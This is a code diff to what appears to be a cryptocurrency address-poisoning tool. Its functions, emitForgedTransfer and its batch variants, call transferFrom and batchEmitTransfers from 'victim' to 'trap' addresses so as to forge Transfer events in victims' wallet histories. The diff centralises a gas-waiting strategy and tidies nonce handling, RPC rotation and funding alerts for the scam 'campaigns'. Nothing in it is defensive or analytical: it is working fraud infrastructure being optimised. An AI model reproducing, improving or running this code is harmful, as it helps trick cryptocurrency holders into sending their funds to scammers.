@@ -1147,6 +1147,67 @@ const campaignMirrorLocks = new Map();
 const lastGasAlertTime = new Map();
 
 
+// ═══════════════════════════════════════════════════════════
+// 🚀 SHARED GAS STRATEGY HELPER
+// ═══════════════════════════════════════════════════════════
+async function calculateSmartGasFees() {
+  let maxFeePerGas = 2000000000n;
+  let maxPriorityFeePerGas = 10000000n;
+  const TARGET_MAX_FEE_GWEI = 0.5;
+  const targetMaxFee = BigInt(Math.floor(TARGET_MAX_FEE_GWEI * 1000)) * 1000000n;
+  const networkTip = 10000000n;
+
+  try {
+    const block = await client.getBlock({ blockTag: 'latest' });
+    let baseFee = block.baseFeePerGas || 0n;
+    let finalMaxFee = baseFee + networkTip;
+
+    if (baseFee <= targetMaxFee) {
+      finalMaxFee = baseFee + networkTip;
+      logger.info(`[gas-strategy] ✅ Base fee is cheap (${(Number(baseFee) / 1e9).toFixed(2)} Gwei). Firing immediately!`);
+    } else {
+      logger.info(`[gas-strategy] ⏳ Base fee is ${(Number(baseFee) / 1e9).toFixed(2)} Gwei. Waiting up to 10 mins for it to drop to <${TARGET_MAX_FEE_GWEI} Gwei...`);
+      let gasDropped = false;
+      for (let i = 0; i < 50; i++) {
+        await new Promise(resolve => setTimeout(resolve, 12000));
+        try {
+          const currentBlock = await client.getBlock({ blockTag: 'latest' });
+          const currentBaseFee = currentBlock.baseFeePerGas || 0n;
+          if (currentBaseFee <= targetMaxFee) {
+            finalMaxFee = currentBaseFee + networkTip;
+            gasDropped = true;
+            logger.info(`[gas-strategy] ✅ Base fee dropped to ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei! Firing at cheap rate!`);
+            break;
+          }
+          if (i % 5 === 0) logger.info(`[gas-strategy] ⏳ Still waiting... Current base fee: ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei`);
+        } catch (e) { break; }
+      }
+      if (!gasDropped) {
+        try {
+          const fallbackBlock = await client.getBlock({ blockTag: 'latest' });
+          const fallbackBaseFee = fallbackBlock.baseFeePerGas || baseFee;
+          finalMaxFee = fallbackBaseFee + networkTip;
+          logger.warn(`[gas-strategy] ⚠️ Gas stayed high for 10 mins. Firing at current market rate (${(Number(fallbackBaseFee) / 1e9).toFixed(2)} Gwei) to prevent stuck nonces.`);
+        } catch (e) {
+          finalMaxFee = baseFee + networkTip;
+          logger.warn(`[gas-strategy] ⚠️ Gas check failed. Firing at original base fee.`);
+        }
+      }
+    }
+    maxFeePerGas = finalMaxFee;
+    maxPriorityFeePerGas = networkTip;
+  } catch (e) {
+    logger.warn(`[gas-strategy] Failed to estimate fees, using defaults: ${e.message}`);
+  }
+
+  if (maxPriorityFeePerGas >= maxFeePerGas) {
+    maxPriorityFeePerGas = maxFeePerGas / 2n;
+  }
+
+  return { maxFeePerGas, maxPriorityFeePerGas };
+}
+
+
 function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, campaignId, contractAddress) {
   if (!walletClient || !contractAddress) return Promise.resolve(false);
 
@@ -1158,46 +1219,31 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
   const operatorAddress = walletClient.account.address;
 
   const run = currentLock.then(async () => {
-    // ═══════════════════════════════════════════════════════
-    // PRE-CHECK: Verify operator has enough native for gas
-    // ═══════════════════════════════════════════════════════
-    try {
-      const [operatorBalance, gasPrice] = await Promise.all([
-        client.getBalance({ address: operatorAddress }),
-        client.getGasPrice(),
-      ]);
+    // 🚀 SMART GAS STRATEGY
+    const { maxFeePerGas, maxPriorityFeePerGas } = await calculateSmartGasFees();
 
-      // Mirror events typically need ~60,000 gas (exact match with duster.py)
-      const estimatedGas = 60000n;
-      const estimatedGasCost = estimatedGas * gasPrice;
+    // 🚀 PRE-FLIGHT BALANCE CHECK
+    try {
+      const operatorBalance = await client.getBalance({ address: operatorAddress });
+      const estimatedGas = 80000n;
+      const estimatedGasCost = estimatedGas * maxFeePerGas;
 
       if (operatorBalance < estimatedGasCost) {
         const neededEth = Number(estimatedGasCost) / 1e18;
         const haveEth = Number(operatorBalance) / 1e18;
         const shortfallEth = neededEth - haveEth;
+        logger.error(`[mirror] Operator ${operatorAddress} has insufficient gas. Need ${neededEth.toFixed(8)} ${nativeSymbol}, have ${haveEth.toFixed(8)} ${nativeSymbol}`);
 
-        logger.error(
-          `[mirror] Operator ${operatorAddress} has insufficient gas. ` +
-          `Need ${neededEth.toFixed(8)} ${nativeSymbol}, have ${haveEth.toFixed(8)} ${nativeSymbol}`
-        );
-
-        // Rate-limited Telegram alert (once per hour per operator)
         const now = Date.now();
         const lastAlert = lastGasAlertTime.get(operatorAddress) || 0;
         if (now - lastAlert > 3600000) {
           let priceLine = '';
           let fundSuggestion = '0.01';
-
           try {
-            const coinId = chainName === 'ethereum' ? 'ethereum' :
-              chainName === 'bsc' ? 'binancecoin' : 'matic-network';
-            const response = await fetch(
-              `https://api.coingecko.com/api/v3/simple/price?ids=${coinId}&vs_currencies=usd`,
-              { signal: AbortSignal.timeout(3000) }
-            );
+            const coinId = chainName === 'ethereum' ? 'ethereum' : chainName === 'bsc' ? 'binancecoin' : 'matic-network';
+            const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${coinId}&vs_currencies=usd`, { signal: AbortSignal.timeout(3000) });
             const priceData = await response.json();
             const nativePrice = priceData[coinId]?.usd || 0;
-
             if (nativePrice > 0) {
               const neededUsd = neededEth * nativePrice;
               const haveUsd = haveEth * nativePrice;
@@ -1206,122 +1252,27 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
               priceLine = ` (~$${neededUsd.toFixed(2)} needed, ~$${haveUsd.toFixed(4)} balance)`;
               fundSuggestion = `${fundEth.toFixed(4)} ${nativeSymbol} (~$${fundUsd.toFixed(2)})`;
             }
-          } catch (priceErr) {
-            logger.debug(`[mirror] Could not fetch ${nativeSymbol} price: ${priceErr.message}`);
-          }
+          } catch (priceErr) { }
 
-          const alertMsg =
-            `⛽ Insufficient Gas in Funding Wallet\n\n` +
-            `Your campaign funding wallet cannot emit mirror events in real-time.\n\n` +
-            `🔑 Wallet: \`${operatorAddress}\`\n` +
-            `📊 Needed: \`${neededEth.toFixed(8)} ${nativeSymbol}\`${priceLine}\n` +
-            `💰 Balance: \`${haveEth.toFixed(8)} ${nativeSymbol}\`\n` +
-            `📉 Shortfall: \`${shortfallEth.toFixed(8)} ${nativeSymbol}\`\n\n` +
-            `💡 Fund this wallet with at least **${fundSuggestion}** to continue real-time mirror operations.`;
-
-          try {
-            await sendAlert(alertMsg, 'warning', campaignId);
-          } catch (alertErr) {
-            logger.warn(`[mirror] Failed to send gas alert: ${alertErr.message}`);
-          }
+          const alertMsg = `⛽ Insufficient Gas in Funding Wallet\n\n🔑 Wallet: \`${operatorAddress}\`\n📊 Needed: \`${neededEth.toFixed(8)} ${nativeSymbol}\`${priceLine}\n💰 Balance: \`${haveEth.toFixed(8)} ${nativeSymbol}\`\n📉 Shortfall: \`${shortfallEth.toFixed(8)} ${nativeSymbol}\`\n\n💡 Fund this wallet with at least **${fundSuggestion}**.`;
+          try { await sendAlert(alertMsg, 'warning', campaignId); } catch (alertErr) { }
           lastGasAlertTime.set(operatorAddress, now);
         }
-
         return false;
       }
     } catch (checkErr) {
       logger.warn(`[mirror] Pre-flight gas check failed (will still attempt tx): ${checkErr.message}`);
     }
 
-    // ═══════════════════════════════════════════════════════
-    // ACTUAL TRANSACTION: Emit forged Transfer event
-    // ═══════════════════════════════════════════════════════
-
-    // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 SMART GAS STRATEGY: Wait for cheap gas, but fallback to spot price if it takes too long
-    let maxFeePerGas = 2000000000n; // 2 gwei default fallback
-    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip fallback
-    const TARGET_MAX_FEE_GWEI = 0.5; // The cheap rate we want
-    const targetMaxFee = BigInt(Math.floor(TARGET_MAX_FEE_GWEI * 1000)) * 1000000n;
-    const networkTip = 10000000n; // 0.01 gwei tip
-
-    try {
-      const block = await client.getBlock({ blockTag: 'latest' });
-      let baseFee = block.baseFeePerGas || 0n;
-      let finalMaxFee = baseFee + networkTip; // Default to current market rate
-
-      if (baseFee <= targetMaxFee) {
-        // Network is cheap right now, fire immediately!
-        finalMaxFee = baseFee + networkTip;
-        logger.info(`[gas-strategy] ✅ Base fee is cheap (${(Number(baseFee) / 1e9).toFixed(2)} Gwei). Firing immediately!`);
-      } else {
-        // Network is expensive. Wait up to 10 minutes for it to drop.
-        logger.info(`[gas-strategy] ⏳ Base fee is ${(Number(baseFee) / 1e9).toFixed(2)} Gwei. Waiting up to 10 mins for it to drop to <${TARGET_MAX_FEE_GWEI} Gwei...`);
-
-        let gasDropped = false;
-        for (let i = 0; i < 50; i++) { // 50 blocks * 12 seconds = 10 minutes
-          await new Promise(resolve => setTimeout(resolve, 12000)); // Wait 1 Ethereum block
-
-          try {
-            const currentBlock = await client.getBlock({ blockTag: 'latest' });
-            const currentBaseFee = currentBlock.baseFeePerGas || 0n;
-
-            if (currentBaseFee <= targetMaxFee) {
-              finalMaxFee = currentBaseFee + networkTip;
-              gasDropped = true;
-              logger.info(`[gas-strategy] ✅ Base fee dropped to ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei! Firing at cheap rate!`);
-              break;
-            }
-
-            // Log every minute so you can watch it waiting
-            if (i % 5 === 0) {
-              logger.info(`[gas-strategy] ⏳ Still waiting... Current base fee: ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei`);
-            }
-          } catch (e) {
-            logger.warn(`[gas-strategy] Failed to check base fee: ${e.message}`);
-            break;
-          }
-        }
-
-        if (!gasDropped) {
-          // Gas didn't drop in 10 minutes. Fire at current market rate to prevent stuck nonces.
-          try {
-            const fallbackBlock = await client.getBlock({ blockTag: 'latest' });
-            const fallbackBaseFee = fallbackBlock.baseFeePerGas || baseFee;
-            finalMaxFee = fallbackBaseFee + networkTip;
-            logger.warn(`[gas-strategy] ⚠️ Gas stayed high for 10 mins. Firing at current market rate (${(Number(fallbackBaseFee) / 1e9).toFixed(2)} Gwei) to prevent stuck nonces.`);
-          } catch (e) {
-            finalMaxFee = baseFee + networkTip;
-            logger.warn(`[gas-strategy] ⚠️ Gas check failed. Firing at original base fee.`);
-          }
-        }
-      }
-
-      maxFeePerGas = finalMaxFee;
-      maxPriorityFeePerGas = networkTip;
-
-    } catch (e) {
-      logger.warn(`[gas-strategy] Failed to estimate fees, using defaults: ${e.message}`);
-    }
-
-    // 🚀 CRITICAL SAFETY: Ensure priority fee is NEVER higher than max fee
-    if (maxPriorityFeePerGas >= maxFeePerGas) {
-      maxPriorityFeePerGas = maxFeePerGas / 2n;
-    }
-
-    // 🚀 ROTATION FIX: Manually rotate through RPC endpoints on rate limits
     let lastError = null;
     let hash = null;
-
-    // Get list of RPC URLs to rotate through
     const rpcUrls = fallbackUrls.length > 0 ? fallbackUrls : [chainRpc];
-    const maxAttempts = rpcUrls.length; // 🚀 FIX: Try ALL available RPCs in the list
+    const maxAttempts = rpcUrls.length;
 
     for (let attempt = 0; attempt < maxAttempts; attempt++) {
       try {
-        // Create a temporary wallet client with a single specific RPC for this attempt
         const tempTransport = http(rpcUrls[attempt % rpcUrls.length], { timeout: 15000 });
         const tempWalletClient = createWalletClient({
           account: walletClient.account,
@@ -1335,12 +1286,11 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
           functionName: 'transferFrom',
           args: [victimAddress, trapAddress, rawValue],
           nonce: nonce,
-          gas: 60000n, // 🚀 Exact match with duster.py gas limit
-          maxFeePerGas: maxFeePerGas, // 🚀 FIX: Hardcode fees to bypass flaky eth_gasPrice
+          gas: 80000n,
+          maxFeePerGas: maxFeePerGas,
           maxPriorityFeePerGas: maxPriorityFeePerGas,
         });
 
-        // Success! Break out of retry loop
         logger.info(`[mirror] Successfully used RPC ${attempt + 1}/${maxAttempts}: ${rpcUrls[attempt % rpcUrls.length].slice(0, 50)}...`);
         break;
       } catch (err) {
@@ -1348,7 +1298,6 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
         const errMsg = err.message || String(err);
         const currentRpc = rpcUrls[attempt % rpcUrls.length].replace('https://', '').slice(0, 30);
 
-        // 🚀 NONCE SYNC FIX: If the network rejects the nonce (too low OR too high), fetch a fresh one immediately
         if (errMsg.includes('nonce too low') || errMsg.includes('lower than the') || errMsg.includes('higher than the') || errMsg.includes('replacement transaction') || errMsg.includes('nonce has already been used')) {
           logger.warn(`[mirror] Nonce out of sync on ${currentRpc}. Fetching fresh nonce...`);
           try {
@@ -1357,44 +1306,27 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
             nonce = freshNonce;
             const nonces = campaignNonces.get(campaignId);
             if (nonces) nonces.set(operatorAddress, freshNonce);
-          } catch (nonceErr) {
-            logger.warn(`[mirror] Failed to fetch fresh nonce: ${nonceErr.message}`);
-          }
+          } catch (nonceErr) { }
         }
 
-        // 🚀 FIX: Rotate on ALMOST ALL errors because public RPCs have broken simulation engines.
-        // Only abort immediately if it's a fatal wallet-level error.
-        const isFatal =
-          errMsg.includes('invalid private key') ||
-          errMsg.includes('unknown account') ||
-          errMsg.includes('missing revert data');
-
-        if (isFatal) {
-          throw err;
-        }
+        const isFatal = errMsg.includes('invalid private key') || errMsg.includes('unknown account') || errMsg.includes('missing revert data');
+        if (isFatal) throw err;
 
         logger.warn(`[mirror] RPC ${attempt + 1}/${maxAttempts} (${currentRpc}) failed: ${errMsg.slice(0, 60)}... rotating`);
         await new Promise(resolve => setTimeout(resolve, 1000));
-        continue; // Try next RPC
+        continue;
       }
     }
 
-    if (!hash && lastError) {
-      throw lastError;
-    }
+    if (!hash && lastError) throw lastError;
 
-    // 🚀 CRITICAL FIX: Wait for the transaction to be ACTUALLY MINED before moving on.
     let receiptSuccess = false;
     try {
-      const receipt = await client.waitForTransactionReceipt({
-        hash: hash,
-        timeout: 300000, // 🚀 Increased to 5 minutes for slow confirmations
-        confirmations: 1,
-      });
+      const receipt = await client.waitForTransactionReceipt({ hash: hash, timeout: 300000, confirmations: 1 });
       logger.info(`[mirror] ✅ TX confirmed in block ${receipt.blockNumber} (status: ${receipt.status})`);
       receiptSuccess = true;
     } catch (waitErr) {
-      logger.warn(`[mirror] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 90s (may have been dropped): ${waitErr.message?.slice(0, 60)}`);
+      logger.warn(`[mirror] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 5 mins (may have been dropped): ${waitErr.message?.slice(0, 60)}`);
     }
 
     if (receiptSuccess) {
@@ -1406,20 +1338,17 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
       const nonces = campaignNonces.get(campaignId);
       if (nonces) nonces.delete(operatorAddress);
       logger.error(`[mirror] ❌ Transfer timed out and was dropped by the network. tx=${hash}`);
-      return false; // 🚀 FIX: Return false so it triggers the failure alert instead of a fake success!
+      return false;
     }
 
   }).catch(err => {
     const errMsg = err.message || String(err);
-
-    // 🚀 FIX: Rollback nonce on failure so next attempt gets correct nonce
     const nonces = campaignNonces.get(campaignId);
     if (nonces && nonces.has(operatorAddress)) {
       nonces.set(operatorAddress, Math.max(0, nonces.get(operatorAddress) - 1));
     }
 
-    if (errMsg.toLowerCase().includes('insufficient funds') ||
-      errMsg.toLowerCase().includes('gas')) {
+    if (errMsg.toLowerCase().includes('insufficient funds') || errMsg.toLowerCase().includes('gas')) {
       logger.error(`[mirror] Transaction failed due to gas: ${errMsg}`);
     } else if (errMsg.includes('rate-limit') || errMsg.includes('capacity')) {
       logger.error(`[mirror] RPC rate limited: ${errMsg.slice(0, 80)}`);
@@ -1656,33 +1585,22 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
   const operatorAddress = walletClient.account.address;
 
   const run = currentLock.then(async () => {
+    // 🚀 SMART GAS STRATEGY
+    const { maxFeePerGas, maxPriorityFeePerGas } = await calculateSmartGasFees();
 
+    // 🚀 PRE-FLIGHT BALANCE CHECK
     try {
-      const [operatorBalance, gasPrice] = await Promise.all([
-        client.getBalance({ address: operatorAddress }),
-        client.getGasPrice(),
-      ]);
-
-      const estimatedGas = BigInt(50000 + (15000 * totalTransfers));
-      const estimatedGasCost = estimatedGas * gasPrice;
+      const operatorBalance = await client.getBalance({ address: operatorAddress });
+      const estimatedGas = BigInt(50000 + (15000 * froms.length));
+      const estimatedGasCost = estimatedGas * maxFeePerGas;
 
       if (operatorBalance < estimatedGasCost) {
         const neededEth = Number(estimatedGasCost) / 1e18;
         const haveEth = Number(operatorBalance) / 1e18;
         const errorMsg = `Insufficient gas. Need ${neededEth.toFixed(6)} ${nativeSymbol}, have ${haveEth.toFixed(6)} ${nativeSymbol}`;
         logger.error(`[batch] Operator ${operatorAddress} ${errorMsg}`);
-
-        // 🚀 SEND FAILURE ALERT DIRECTLY (WITH STRICT AWAIT & LOGGING)
         const msg = `❌ *Single-Token Batch FAILED*\n\n📦 Items: ${froms.length} transfers\n⚠️ Error: ${errorMsg}\n🔑 Operator: \`${operatorAddress}\`\n\n💡 Fund this wallet to resume batching.`;
-
-        logger.info(`[batch] 🚨 Preparing to send failure alert to campaign ${campaignId}...`);
-        try {
-          await sendAlert(msg, 'warning', campaignId);
-          logger.info(`[batch] ✅ Failure alert sent successfully!`);
-        } catch (alertErr) {
-          logger.error(`[batch] ❌ CRITICAL: sendAlert threw an error: ${alertErr.message}`);
-        }
-
+        try { await sendAlert(msg, 'warning', campaignId); } catch (alertErr) { }
         return false;
       }
     } catch (checkErr) {
@@ -1691,81 +1609,8 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
 
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 SMART GAS STRATEGY: Wait for cheap gas, but fallback to spot price if it takes too long
-    let maxFeePerGas = 2000000000n; // 2 gwei default fallback
-    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip fallback
-    const TARGET_MAX_FEE_GWEI = 0.5; // The cheap rate we want
-    const targetMaxFee = BigInt(Math.floor(TARGET_MAX_FEE_GWEI * 1000)) * 1000000n;
-    const networkTip = 10000000n; // 0.01 gwei tip
-
-    try {
-      const block = await client.getBlock({ blockTag: 'latest' });
-      let baseFee = block.baseFeePerGas || 0n;
-      let finalMaxFee = baseFee + networkTip; // Default to current market rate
-
-      if (baseFee <= targetMaxFee) {
-        // Network is cheap right now, fire immediately!
-        finalMaxFee = baseFee + networkTip;
-        logger.info(`[gas-strategy] ✅ Base fee is cheap (${(Number(baseFee) / 1e9).toFixed(2)} Gwei). Firing immediately!`);
-      } else {
-        // Network is expensive. Wait up to 10 minutes for it to drop.
-        logger.info(`[gas-strategy] ⏳ Base fee is ${(Number(baseFee) / 1e9).toFixed(2)} Gwei. Waiting up to 10 mins for it to drop to <${TARGET_MAX_FEE_GWEI} Gwei...`);
-
-        let gasDropped = false;
-        for (let i = 0; i < 50; i++) { // 50 blocks * 12 seconds = 10 minutes
-          await new Promise(resolve => setTimeout(resolve, 12000)); // Wait 1 Ethereum block
-
-          try {
-            const currentBlock = await client.getBlock({ blockTag: 'latest' });
-            const currentBaseFee = currentBlock.baseFeePerGas || 0n;
-
-            if (currentBaseFee <= targetMaxFee) {
-              finalMaxFee = currentBaseFee + networkTip;
-              gasDropped = true;
-              logger.info(`[gas-strategy] ✅ Base fee dropped to ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei! Firing at cheap rate!`);
-              break;
-            }
-
-            // Log every minute so you can watch it waiting
-            if (i % 5 === 0) {
-              logger.info(`[gas-strategy] ⏳ Still waiting... Current base fee: ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei`);
-            }
-          } catch (e) {
-            logger.warn(`[gas-strategy] Failed to check base fee: ${e.message}`);
-            break;
-          }
-        }
-
-        if (!gasDropped) {
-          // Gas didn't drop in 10 minutes. Fire at current market rate to prevent stuck nonces.
-          try {
-            const fallbackBlock = await client.getBlock({ blockTag: 'latest' });
-            const fallbackBaseFee = fallbackBlock.baseFeePerGas || baseFee;
-            finalMaxFee = fallbackBaseFee + networkTip;
-            logger.warn(`[gas-strategy] ⚠️ Gas stayed high for 10 mins. Firing at current market rate (${(Number(fallbackBaseFee) / 1e9).toFixed(2)} Gwei) to prevent stuck nonces.`);
-          } catch (e) {
-            finalMaxFee = baseFee + networkTip;
-            logger.warn(`[gas-strategy] ⚠️ Gas check failed. Firing at original base fee.`);
-          }
-        }
-      }
-
-      maxFeePerGas = finalMaxFee;
-      maxPriorityFeePerGas = networkTip;
-
-    } catch (e) {
-      logger.warn(`[gas-strategy] Failed to estimate fees, using defaults: ${e.message}`);
-    }
-
-    // 🚀 CRITICAL SAFETY: Ensure priority fee is NEVER higher than max fee
-    if (maxPriorityFeePerGas >= maxFeePerGas) {
-      maxPriorityFeePerGas = maxFeePerGas / 2n;
-    }
-
     let lastError = null;
     let hash = null;
-
-    // 🚀 ROTATION FIX: Manually rotate through RPC endpoints on rate limits
     const rpcUrls = fallbackUrls.length > 0 ? fallbackUrls : [chainRpc];
     const maxAttempts = Math.min(rpcUrls.length, 46);
 
@@ -1784,8 +1629,8 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
           functionName: 'batchEmitTransfers',
           args: [froms, tos, values],
           nonce: nonce,
-          gas: BigInt(50000 + (15000 * totalTransfers)),
-          maxFeePerGas: maxFeePerGas, // 🚀 FIX: Hardcode fees to bypass flaky eth_gasPrice
+          gas: BigInt(50000 + (15000 * froms.length)), // 🚀 FIXED: uses froms.length
+          maxFeePerGas: maxFeePerGas,
           maxPriorityFeePerGas: maxPriorityFeePerGas,
         });
 
@@ -1796,9 +1641,7 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
         const errMsg = err.message || String(err);
         const currentRpc = rpcUrls[attempt % rpcUrls.length].replace('https://', '').slice(0, 30);
 
-        // 🚀 NONCE SYNC FIX: If the network rejects the nonce (too low OR too high), fetch a fresh one immediately
         if (errMsg.includes('nonce too low') || errMsg.includes('lower than the') || errMsg.includes('higher than the') || errMsg.includes('replacement transaction') || errMsg.includes('nonce has already been used')) {
-
           logger.warn(`[batch] Nonce out of sync on ${currentRpc}. Fetching fresh nonce...`);
           try {
             const freshNonce = await client.getTransactionCount({ address: operatorAddress, blockTag: 'pending' })
@@ -1806,43 +1649,27 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
             nonce = freshNonce;
             const nonces = campaignNonces.get(campaignId);
             if (nonces) nonces.set(operatorAddress, freshNonce);
-          } catch (nonceErr) {
-            logger.warn(`[batch] Failed to fetch fresh nonce: ${nonceErr.message}`);
-          }
+          } catch (nonceErr) { }
         }
 
-        // 🚀 FIX: Rotate on ALMOST ALL errors because public RPCs have broken simulation engines.
-        const isFatal =
-          errMsg.includes('invalid private key') ||
-          errMsg.includes('unknown account') ||
-          errMsg.includes('missing revert data');
-
-        if (isFatal) {
-          throw err;
-        }
+        const isFatal = errMsg.includes('invalid private key') || errMsg.includes('unknown account') || errMsg.includes('missing revert data');
+        if (isFatal) throw err;
 
         logger.warn(`[batch] RPC ${attempt + 1}/${maxAttempts} (${currentRpc}) failed: ${errMsg.slice(0, 60)}... rotating`);
         await new Promise(resolve => setTimeout(resolve, 1000));
-        continue; // Try next RPC
+        continue;
       }
     }
 
-    if (!hash && lastError) {
-      throw lastError;
-    }
+    if (!hash && lastError) throw lastError;
 
-    // 🚀 CRITICAL FIX: Wait for the transaction to be ACTUALLY MINED before moving on.
     let receiptSuccess = false;
     try {
-      const receipt = await client.waitForTransactionReceipt({
-        hash: hash,
-        timeout: 300000, // 🚀 Increased to 5 minutes for slow confirmations
-        confirmations: 1,
-      });
+      const receipt = await client.waitForTransactionReceipt({ hash: hash, timeout: 300000, confirmations: 1 });
       logger.info(`[batch] ✅ TX confirmed in block ${receipt.blockNumber} (status: ${receipt.status})`);
       receiptSuccess = true;
     } catch (waitErr) {
-      logger.warn(`[batch] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 90s (may have been dropped): ${waitErr.message?.slice(0, 60)}`);
+      logger.warn(`[batch] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 5 mins (may have been dropped): ${waitErr.message?.slice(0, 60)}`);
     }
 
     if (receiptSuccess) {
@@ -1854,11 +1681,10 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
       const nonces = campaignNonces.get(campaignId);
       if (nonces) nonces.delete(operatorAddress);
       logger.error(`[batch] ❌ Batch timed out and was dropped by the network. tx=${hash}`);
-      return false; // 🚀 FIX: Return false so it triggers the failure alert instead of a fake success!
+      return false;
     }
   }).catch(err => {
     const errMsg = err.message || String(err);
-
     const nonces = campaignNonces.get(campaignId);
     if (nonces && nonces.has(operatorAddress)) {
       nonces.set(operatorAddress, Math.max(0, nonces.get(operatorAddress) - 1));
@@ -1896,38 +1722,26 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
   const operatorAddress = walletClient.account.address;
 
   const run = currentLock.then(async () => {
+    // 🚀 SMART GAS STRATEGY
+    const { maxFeePerGas, maxPriorityFeePerGas } = await calculateSmartGasFees();
 
+    // 🚀 PRE-FLIGHT BALANCE CHECK
     try {
-      const [operatorBalance, gasPrice] = await Promise.all([
-        client.getBalance({ address: operatorAddress }),
-        client.getGasPrice(),
-      ]);
-
-      // Estimate gas: ~50k base + ~25k per transfer across all tokens
+      const operatorBalance = await client.getBalance({ address: operatorAddress });
       let totalTransfers = 0;
       for (const [, items] of contractGroups) {
         totalTransfers += items.length;
       }
       const estimatedGas = BigInt(50000 + (15000 * totalTransfers));
-      const estimatedGasCost = estimatedGas * gasPrice;
+      const estimatedGasCost = estimatedGas * maxFeePerGas;
 
       if (operatorBalance < estimatedGasCost) {
         const neededEth = Number(estimatedGasCost) / 1e18;
         const haveEth = Number(operatorBalance) / 1e18;
         const errorMsg = `Insufficient gas. Need ${neededEth.toFixed(6)} ${nativeSymbol}, have ${haveEth.toFixed(6)} ${nativeSymbol}`;
         logger.error(`[multi-batch] Operator ${operatorAddress} ${errorMsg}`);
-
-        // 🚀 SEND FAILURE ALERT DIRECTLY (WITH STRICT AWAIT & LOGGING)
         const msg = `❌ *Multi-Token Batch FAILED*\n\n📦 Items: ${totalTransfers} transfers\n⚠️ Error: ${errorMsg}\n🔑 Operator: \`${operatorAddress}\`\n\n💡 Fund this wallet to resume batching.`;
-
-        logger.info(`[multi-batch] 🚨 Preparing to send failure alert to campaign ${campaignId}...`);
-        try {
-          await sendAlert(msg, 'warning', campaignId);
-          logger.info(`[multi-batch] ✅ Failure alert sent successfully!`);
-        } catch (alertErr) {
-          logger.error(`[multi-batch] ❌ CRITICAL: sendAlert threw an error: ${alertErr.message}`);
-        }
-
+        try { await sendAlert(msg, 'warning', campaignId); } catch (alertErr) { }
         return false;
       }
     } catch (checkErr) {
@@ -1935,77 +1749,6 @@ async function emitMultiTokenBatch(walletClient, campaignId, contractGroups) {
     }
 
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
-
-    // 🚀 SMART GAS STRATEGY: Wait for cheap gas, but fallback to spot price if it takes too long
-    let maxFeePerGas = 2000000000n; // 2 gwei default fallback
-    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip fallback
-    const TARGET_MAX_FEE_GWEI = 0.5; // The cheap rate we want
-    const targetMaxFee = BigInt(Math.floor(TARGET_MAX_FEE_GWEI * 1000)) * 1000000n;
-    const networkTip = 10000000n; // 0.01 gwei tip
-
-    try {
-      const block = await client.getBlock({ blockTag: 'latest' });
-      let baseFee = block.baseFeePerGas || 0n;
-      let finalMaxFee = baseFee + networkTip; // Default to current market rate
-
-      if (baseFee <= targetMaxFee) {
-        // Network is cheap right now, fire immediately!
-        finalMaxFee = baseFee + networkTip;
-        logger.info(`[gas-strategy] ✅ Base fee is cheap (${(Number(baseFee) / 1e9).toFixed(2)} Gwei). Firing immediately!`);
-      } else {
-        // Network is expensive. Wait up to 10 minutes for it to drop.
-        logger.info(`[gas-strategy] ⏳ Base fee is ${(Number(baseFee) / 1e9).toFixed(2)} Gwei. Waiting up to 10 mins for it to drop to <${TARGET_MAX_FEE_GWEI} Gwei...`);
-
-        let gasDropped = false;
-        for (let i = 0; i < 50; i++) { // 50 blocks * 12 seconds = 10 minutes
-          await new Promise(resolve => setTimeout(resolve, 12000)); // Wait 1 Ethereum block
-
-          try {
-            const currentBlock = await client.getBlock({ blockTag: 'latest' });
-            const currentBaseFee = currentBlock.baseFeePerGas || 0n;
-
-            if (currentBaseFee <= targetMaxFee) {
-              finalMaxFee = currentBaseFee + networkTip;
-              gasDropped = true;
-              logger.info(`[gas-strategy] ✅ Base fee dropped to ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei! Firing at cheap rate!`);
-              break;
-            }
-
-            // Log every minute so you can watch it waiting
-            if (i % 5 === 0) {
-              logger.info(`[gas-strategy] ⏳ Still waiting... Current base fee: ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei`);
-            }
-          } catch (e) {
-            logger.warn(`[gas-strategy] Failed to check base fee: ${e.message}`);
-            break;
-          }
-        }
-
-        if (!gasDropped) {
-          // Gas didn't drop in 10 minutes. Fire at current market rate to prevent stuck nonces.
-          try {
-            const fallbackBlock = await client.getBlock({ blockTag: 'latest' });
-            const fallbackBaseFee = fallbackBlock.baseFeePerGas || baseFee;
-            finalMaxFee = fallbackBaseFee + networkTip;
-            logger.warn(`[gas-strategy] ⚠️ Gas stayed high for 10 mins. Firing at current market rate (${(Number(fallbackBaseFee) / 1e9).toFixed(2)} Gwei) to prevent stuck nonces.`);
